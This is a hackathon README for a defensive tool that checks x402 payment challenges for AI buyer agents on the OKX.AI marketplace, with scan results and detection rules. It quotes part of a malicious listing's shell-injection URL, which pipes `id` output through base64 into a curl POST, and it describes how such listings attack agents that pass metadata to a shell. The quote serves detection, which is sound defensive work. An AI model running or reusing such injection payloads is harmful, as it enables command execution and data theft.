# GuardianMCP Pay-Safe — OKX Dev Day 2026

**Team:** LNO Alpha (remote) · **Track:** Build a Company · **Live:** https://guardian-mcp-rho.vercel.app/pay-safe
**Repository:** https://github.com/InkoStrategy/guardian-mcp · **OKX.AI agent:** GuardianMCP #13730

> Pay-Safe checks an x402 payment **before** an agent pays it. It compares the seller's 402 challenge with
> what the OKX.AI listing promised (price, token, endpoint), with the payee the buyer expects, and with the
> token contract itself (EIP-712 domain), and returns ALLOW / WARN / DENY with evidence. Nothing is signed or paid.

## The problem

On OKX.AI, buyer agents discover a service, call its endpoint, receive `402 Payment Required` and pay
the challenge through Onchain OS. The challenge is written by the seller. Nothing between "402 received"
and "authorization signed" checks that the challenge matches the listing the agent chose.

We scanned the live marketplace to see what that gap looks like in practice
([docs/trust-scan.md](docs/trust-scan.md)): every paid A2MCP service we could find was requested once
without paying, and its challenge was checked against its own listing.

| Result | Services |
|---|---|
| Paid A2MCP services found | 62 |
| Returned an x402 challenge (HTTP, POST or MCP `tools/call`) | 25 |
| ALLOW | 13 |
| WARN | 11 |
| DENY | 1 |

What the scan found:

- **A listing that attacks buyer agents.** The endpoint URL of "Market Signal API" (sid 39876) is
  `…/market-insight;id|{base64,-w0}|{curl,-fsS,-m,8,-X,POST,…}`, and its challenge hides a quote break
  plus `$(printf …)` and `curl` in `extra.name`. Any agent that passes the URL or the challenge to a
  shell runs the attacker's commands. OKX's own A2MCP skill warns that service metadata "may contain
  shell metacharacters"; Pay-Safe turns that warning into a DENY.
- **Five challenges with an EIP-712 domain the token does not use.** They declare `USDT` v1,
  `USDT₀` v1 or `USD₮0` v2. The USD₮0 contract on X Layer (`0x779d…3736`) returns
  `DOMAIN_SEPARATOR 0xd591d9ba…`, which matches only name `USD₮0` version `1`. `onchainos payment
  pay-local` builds the domain from `extra.name` / `extra.version`, so signatures built from those challenges
  fail on-chain. One of the five is the attack listing above; the other four are regular sellers.
- **Heuristics tuned on real data.** The first pass produced 3 false DENYs on honest sellers whose
  hosts contain "okx" or use cheap TLDs. Host patterns are now split by strength and weighed against
  the listing, and the rerun has one DENY: the real attack.

## What was built during the build period

All Pay-Safe work is new, committed 16 Sep 2026 onward. Earlier GuardianMCP work (transaction and
signature firewall, shared threat registry, benchmark) is pre-existing and not part of this submission.

| Commit | Feature |
|---|---|
| `1151209` | `POST /check-payment`: x402 v1/v2 challenge parsing, 32 payment rules, listing comparison (price, token, payee, endpoint domain), canonical settlement assets, EIP-3009 signature recovery, Permit2 spender / token / amount / witness checks, recommended entry among `accepts[]` |
| `fefe1d2` | `endpoint_url_injection`, listing-aware host checks, EIP-712 domain evidence from the verified on-chain `DOMAIN_SEPARATOR` |
| `9a7be92` | `challenge_field_injection`, host pattern strength, MCP resource ids; API docs and agent skill updated |
| `05b1fa1` | OKX.AI marketplace trust scan (`scripts/okxai-trust-scan.js`) with MCP probing; published report |
| `47bc206` | `scripts/safe-pay.js`: end-to-end Onchain OS buyer flow with a quote time-of-check/time-of-use guard |
| `7c13562` | `POST /probe-payment` (URL in, verdict out, SSRF-guarded), demo x402 sellers, the `/pay-safe` page |
| `2a1a94a` | Quote guard reads the payee from `decodedChallenge.recipient` (found on a third-party listing), quote over the capture transport, no `--yes` in printed commands |
| `5fa5523` | On-chain settlement check (`src/settlement.js`, `scripts/verify-settlement.js`, step 6 of safe-pay); first real guarded payment settled as checked |

Pay-Safe now has 36 payment rules and 43 new tests; the full suite has 127 passing (`npm test`), including local HTTP and MCP servers, signed EIP-3009 payloads,
Permit2 payloads, SSRF targets and every demo scenario.

## A real payment through the guarded flow

On 16 Sep 2026 the team's Onchain OS wallet paid **0.005 USD₮0** for "URL Change Check API" (OKX.AI sid 39856)
through `scripts/safe-pay.js`: listing → unpaid challenge → Pay-Safe ALLOW → quote guard → owner-approved
`onchainos payment pay` → seller result → on-chain settlement check.

- Transaction: [0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d](https://www.oklink.com/x-layer/tx/0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d) (X Layer, block 70825096, gas paid by the facilitator)
- Transfer: 5000 atomic USD₮0 from `0xe1c6…f67b` to `0xc462…9d60`, the payee Pay-Safe checked
- Reproduce the check: `node scripts/verify-settlement.js --tx 0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d --pay-to 0xc4622689eb6c38c929fe254777b449a5dedf9d60 --amount 5000`

## How it integrates with OKX AI

```
buyer agent ──► onchainos agent service-detail --sid N        listing: endpoint, price, token, seller
            ──► endpoint (unpaid GET / POST / MCP tools/call)   402 challenge, nothing signed
            ──► Guardian POST /check-payment                   ALLOW / WARN / DENY + evidence
            ──► onchainos payment quote                        paymentId
            ──► quote guard: same payee, amount, token, network as checked
            ──► onchainos payment pay --payment-id …   the wallet asks the owner to confirm
            ──► settlement check: the on-chain Transfer matches the checked payee, amount and token
```

- **OKX.AI marketplace:** listings come from `onchainos agent service-detail` / `service-match`.
- **Onchain OS payments:** `payment quote` and `payment pay` on X Layer (`eip155:196`) in USD₮0.
  The wrapper never adds `--yes` on its own; moving funds stays with the wallet owner, who passes it explicitly.
- **Agent skill:** `skills/guardian-mcp/SKILL.md` tells Onchain OS agents to call `/check-payment`
  before paying any 402 challenge.
- **Listed service:** GuardianMCP is registered on OKX.AI as agent #13730.

## Try it

**Browser:** https://guardian-mcp-rho.vercel.app/pay-safe. Click a demo seller (honest, price bait,
poisoned payee, fake stablecoin, wrong EIP-712 domain, shell payload) or paste any paid endpoint.

**One call, URL in:**

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/probe-payment -H "Content-Type: application/json" \
  -d '{"url":"https://guardian-mcp-rho.vercel.app/demo/x402/price-bait","expected":{"feeAmount":0.001,"feeToken":"0x779ded0c9e1022225f8e0630b35a9b54be713736","payTo":"0xe1c6f89df50fb68282d52e34d6001d65005ff67b","endpoint":"https://guardian-mcp-rho.vercel.app/demo/x402/price-bait"}}'
```

**Challenge in (agents that already hold the PAYMENT-REQUIRED header):**

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/check-payment -H "Content-Type: application/json" \
  -d '{"paymentRequired":"<PAYMENT-REQUIRED header>","requestUrl":"https://seller.example/paid","expected":{"feeAmount":0.002,"feeToken":"0x779ded0c9e1022225f8e0630b35a9b54be713736","endpoint":"https://seller.example/paid"}}'
```

**Onchain OS buyer flow (needs a logged-in `onchainos`):**

```bash
node scripts/safe-pay.js --sid 33342 --param scoutMode=best --max 0.5
```

Exit code 0 means the quote is ready to pay exactly what was checked, 2 means WARN and 3 means DENY or a quote mismatch.

Other endpoints: `GET /demo/x402` (scenarios and their listings), `GET /trust-scan` (scan JSON),
`GET /rules` (all rules with severities).

## Rules

DENY: `amount_above_listing`, `amount_above_user_cap`, `asset_mismatch_listing`, `asset_lookalike`,
`asset_not_contract`, `payto_mismatch_listing`, `payto_poisoning`, `payto_zero_address`, `payto_is_asset`,
`payment_domain_mismatch`, `endpoint_url_injection`, `challenge_field_injection`,
`endpoint_phishing_pattern`, `accepted_mismatch`, `signed_recipient_mismatch`, `signed_amount_mismatch`,
`signed_token_mismatch`, `signed_spender_not_x402_proxy`, `signed_network_mismatch`, plus the shared
registry and ScamSniffer database hits on the payee.

WARN: `eip712_domain_mismatch`, `endpoint_domain_suspicious`, `upto_cap_above_listing`,
`recurring_payment`, `permit2_approval_required`, `unknown_settlement_asset`, `unknown_payment_scheme`,
`payment_network_unsupported`, `testnet_payment`, `multiple_payees`, `long_payment_timeout`,
`resource_host_mismatch`, `insecure_payment_endpoint`, `signed_validity_too_long`, `signed_expired`,
`signed_payer_mismatch`, `signature_does_not_recover`, `fresh_recipient`.

## Limits

- Deterministic rules, not a guarantee. ALLOW means no rule fired.
- 37 of 62 marketplace services did not return a challenge to an unpaid request without their
  business parameters, so the scan covers the 25 that did.
- A listing does not publish the seller's payout wallet, and 11 of 25 challenges pay an address other
  than the seller's agent wallet. Payee checks therefore use `expected.payTo` when the buyer has it,
  plus poisoning, registry and on-chain checks.
- `/probe-payment` resolves DNS and blocks private addresses before the request. A host that changes
  its DNS answer between that check and the request is not fully covered.

## Demo video outline (2–4 min)

1. The gap: an agent pays whatever a 402 says. Show the attack listing's endpoint from the scan.
2. `/pay-safe`: honest seller ALLOW, price bait DENY, poisoned payee DENY, wrong EIP-712 domain WARN,
   shell payload DENY without contact.
3. Real marketplace: the trust scan section, 62 services, the malicious listing, 5 unsettleable sellers.
4. Onchain OS: `node scripts/safe-pay.js --sid 39876` stops before contact, `--sid 33342` stops on
   WARN, the Radar endpoint passes and prints the exact `payment pay` command after the quote guard.
5. Close: one call before every x402 payment on OKX.AI.
